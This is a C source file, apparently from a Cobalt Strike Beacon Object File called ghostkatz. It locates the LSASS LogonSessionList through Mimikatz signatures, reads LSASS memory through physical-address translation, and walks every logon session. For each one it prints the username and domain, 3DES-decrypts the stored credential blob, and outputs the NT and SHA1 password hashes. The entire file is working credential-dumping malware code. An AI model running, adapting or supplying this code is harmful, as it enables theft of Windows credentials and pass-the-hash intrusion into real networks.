#include <windows.h>
#include <ntstatus.h>

#include "ghostkatz.h"
#include "defs.h"
#include "lsass_offsets.h"

BOOL IsEntryValid(HANDLE hFile, DWORD64 PAtoRead, DWORD lower32bits, int LsassPID, DWORD64 ImageStartAddress)
{
    // Check if left side is valid
    DWORD64 FlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead);
    if (FlinkVA > 0 && FlinkVA < ImageStartAddress)
    {
        DWORD64 tmpPA = 0;
        if (TranslateUVA2Physical(FlinkVA, &tmpPA, lower32bits, LsassPID))
        {
            // Check right Side is Valid
            DWORD64 BlinkVA = ReadAddressAtPhysicalAddressLocation(hFile, PAtoRead + 0x8);
            if (BlinkVA > 0 && BlinkVA < ImageStartAddress)
            {
                tmpPA = 0;
                if (TranslateUVA2Physical(BlinkVA, &tmpPA, lower32bits, LsassPID))
                {
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

DWORD64 SearchForLogonSessionListHead(HANDLE hFile, DWORD64 DataSectionBase, DWORD lower32bits, DWORD LsassPID, DWORD64 ImageStartAddress, DWORD dBuildNumber)
{
    (void)DataSectionBase;
    unsigned char* LogonSessionListSig = NULL;
    int SigSize = 0;
    int LogonSessionList_OFFSET = 0;

    //
    // Get the correct Mimikatz byte sequences and offsets based on version
    //
    int i = 0;
    for (i = 0; i < 12; i++) 
    {
        if ((dBuildNumber >= LsassLogonSessionListArray[i].WindowsVersion) &&
            (dBuildNumber < LsassLogonSessionListArray[i + 1].WindowsVersion))
        {
            LogonSessionListSig = LsassLogonSessionListArray[i].LogonSessionListSig;
            SigSize = LsassLogonSessionListArray[i].SigSize;
            LogonSessionList_OFFSET = LsassLogonSessionListArray[i].LogonSessionList_OFFSET;
            break;
        }
    }

    if (LogonSessionListSig == NULL || SigSize == 0 || LogonSessionList_OFFSET == 0)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get correct LogonSessionList offsets for the Windows version!\n");
        return 0;
    }

    //
    // After getting bytes and offsets, we will then check if we can find the pattern
    //
    PBYTE lsasrvImageBase = (PBYTE)GetModuleHandleA("lsasrv.dll");
    if (lsasrvImageBase == NULL)
    {
        BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!\n");
        return 0;
    }

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lsasrvImageBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
    PBYTE lsasrvTextBase = lsasrvImageBase + pNtHdr->OptionalHeader.BaseOfCode;
    DWORD lsasrvTextSize = pNtHdr->OptionalHeader.SizeOfCode;

    //
    // Search for LogonSessionList signature within lsasrv.dll and grab the offset
    //
    DWORD LogonSessionListSigOffset = SearchPattern(lsasrvTextBase, lsasrvTextSize, LogonSessionListSig, SigSize);
    if (LogonSessionListSigOffset == 0) {
        BeaconFormatPrintf(&outputbuffer, "Could not find offset to LogonSessionList\n");
        return 0;
    }

    //
    // If we found the pattern we can proceed with getting the actual address
    //

    /* Get the full address where the mimikatz byte pattern was found */
    PBYTE LogonSessionList_PatternAddress = lsasrvTextBase + LogonSessionListSigOffset + LogonSessionList_OFFSET;

    /*
        Now get the RIP offset from the pattern address so we can use it later.
        It may look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
        The mimikatz offsets take us directly to the rip offset value we want to retrieve so we have to read 4 bytes forward and reverse the endianness
    */
    DWORD LogonSessionList_RipOffset =
        (LogonSessionList_PatternAddress[3] << 24) |
        (LogonSessionList_PatternAddress[2] << 16) |
        (LogonSessionList_PatternAddress[1] << 8) |
        (LogonSessionList_PatternAddress[0]);

    /*
        RIP-relative offsets are calculated from the instruction *following* the offset.
        Mimikatz resolves the address 4 bytes too early (pointing directly at the offset),
        so we must add 4 bytes to correct the final address.
    */
    DWORD64 Real_LogonSessionList_Address = LogonSessionList_PatternAddress + LogonSessionList_RipOffset + 4;
    DWORD64 LogonSessionListPA = 0;
    if (!TranslateUVA2Physical(Real_LogonSessionList_Address, &LogonSessionListPA, lower32bits, LsassPID))
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Failed to transate LogonSessionList VA to PA!\n");
        return 0;
    }

    //
    // Validate the obtained address; very minimal check
    // previously checked for Primary string in credential struct, but could be NULL if no creds so false negative
    //
    if (!IsEntryValid(hFile, LogonSessionListPA, lower32bits, LsassPID, ImageStartAddress))
    {
        BeaconFormatPrintf(&outputbuffer, "[!] Could not validate LogonSessionList!\n");
        return 0;
    }
    

    return Real_LogonSessionList_Address;
}

BOOL DisplayLogonSessionListInformation(HANDLE hFile, DWORD64 LogonSessionListHead, DWORD lower32bits, DWORD LsassPID, unsigned char* Real3DesKey, int i3DesKeyLength, unsigned char* InitializationVector)
{
    DWORD64 tmpPA = 0;
    DWORD64 kMSV1_0_LIST_63 = 0;
    DWORD64 Flink = 0;
    int bytesWritten = 0;

    // Get the first Flink to start the traversal
    // poi(lsasrv!LogonSessionList)
    TranslateUVA2Physical(LogonSessionListHead, &tmpPA, lower32bits, LsassPID);
    Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);

    
    int i = 0;
    while (Flink != LogonSessionListHead) // Did a full circle back to the beginning of the linked list
    {
        DWORD64 FlinkPA = 0;
        if (!TranslateUVA2Physical(Flink, &FlinkPA, lower32bits, LsassPID))
        {
            break; // Invalid address, break out of loop
        }
        BeaconFormatPrintf(&outputbuffer, "[%04d] Flink Base Address  : 0x%llx\n", i, Flink);


        wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_UserName, lower32bits, LsassPID);
        if (UserNameWideString == NULL || *UserNameWideString == L'\0')
            UserNameWideString = L"(null)";

        char UserNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, UserNameWideString, -1, UserNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : %s\n", UserNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Username    : (Failed to convert to MultiByte string)\n");
        }


        wchar_t* DomainNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + LSA_UNICODE_STRING_Domain, lower32bits, LsassPID);
        if (DomainNameWideString == NULL || *DomainNameWideString == L'\0')
            DomainNameWideString = L"(null)";

        char DomainNameString[MAX_PATH];
        bytesWritten = WideCharToMultiByte(CP_ACP, 0, DomainNameWideString, -1, DomainNameString, MAX_PATH, NULL, NULL);
        if (bytesWritten != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : %s\n", DomainNameString);
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * Domain      : (Failed to convert to MultiByte string)\n");
        }


        // TO DO:
        // printf(L"\t    * SID         : ");
        // DisplaySID(AddressToSid); // Address is db poi(poi(lsasrv!LogonSessionList) + 0xd0)
        // printf("\n");


        // Below is for getting the Crypto Blob
        // poi( poi(lsasrv!LogonSessionList) + 0x108)
        TranslateUVA2Physical(Flink + PKIWI_MSV1_0_CREDENTIALS_Credentials, &tmpPA, lower32bits, LsassPID);
        DWORD64 credentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
        if ( (_wcsicmp(UserNameWideString, L"(null)") != 0 ) && (_wcsicmp(DomainNameWideString, L"(null)") != 0) && (credentialsStruct != 0) )
        {
            // poi( poi( poi(lsasrv!LogonSessionList) + 0x108) + 0x10)
            if (TranslateUVA2Physical(credentialsStruct + PKIWI_MSV1_0_PRIMARY_CREDENTIALS_PrimaryCredentials, &tmpPA, lower32bits, LsassPID))
            {
                // db poi(poi(poi(lsasrv!LogonSessionList)+0x108)+0x10)+0x30
                DWORD64 primaryCredentialsStruct = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
                if (TranslateUVA2Physical(primaryCredentialsStruct + LSA_UNICODE_STRING_Credentials, &tmpPA, lower32bits, LsassPID))
                {
                    // The crypto blob is the MSV1_0_PRIMARY_CREDENTIAL_10_1607 struct here towards the bottom https://whoamianony.top/posts/sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/#3-%E6%89%93%E5%8D%B0%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E4%BF%A1%E6%81%AF
                    unsigned char* cryptoBlob = ReadMultipleBytes(hFile, Credentials_CryptoBlob_Length, tmpPA, TRUE);
                    
                    NTSTATUS status;
                    ULONG cbResult = 0;
                    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
                    BCRYPT_KEY_HANDLE hKey = NULL;
                    UCHAR* bOutput = malloc(Credentials_CryptoBlob_Length);

                    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_3DES_ALGORITHM, NULL, 0);

                    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, Real3DesKey, i3DesKeyLength, 0);
                    if (status == STATUS_SUCCESS)
                    {
                        status = BCryptDecrypt(hKey, cryptoBlob, Credentials_CryptoBlob_Length, 0, InitializationVector, 8, bOutput, Credentials_CryptoBlob_Length, &cbResult, 0);
                        if (status == STATUS_SUCCESS)
                        {
                            BeaconFormatPrintf(&outputbuffer, "\t    * NT Hash     : ");
                            for (int j = 0; j < cbResult; j++)
                            {
                                if (j >= 74 && j < 90) // 4A to 5A
                                {
                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                                }
                            }
                            BeaconFormatPrintf(&outputbuffer, "\n");

                            BeaconFormatPrintf(&outputbuffer, "\t    * SHA1 Hash   : ");
                            for (int j = 0; j < cbResult; j++)
                            {
                                if (j >= 106 && j < 126) // 6A to 7E
                                {
                                    BeaconFormatPrintf(&outputbuffer, "%02x", bOutput[j]);
                                }
                            }
                            BeaconFormatPrintf(&outputbuffer, "\n");
                        }
                        else
                        {
                            BeaconFormatPrintf(&outputbuffer, "[!] Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                        }
                    }
                    else 
                    {
                        BeaconFormatPrintf(&outputbuffer, "\t    * Crypto blob: ");
                        PrintHex(cryptoBlob, Credentials_CryptoBlob_Length);
                    }
                    status = BCryptCloseAlgorithmProvider(hAlgorithm, 0);
                    status = BCryptDestroyKey(hKey);
                    free(bOutput);
                }
            }
        }
        else
        {
            BeaconFormatPrintf(&outputbuffer, "\t    * NT Hash     : (null)\n");
            BeaconFormatPrintf(&outputbuffer, "\t    * SHA1 Hash   : (null)\n");
        }

        BeaconFormatPrintf(&outputbuffer, "\n");
        TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
        Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);

        i++;
    }

    return TRUE;
}
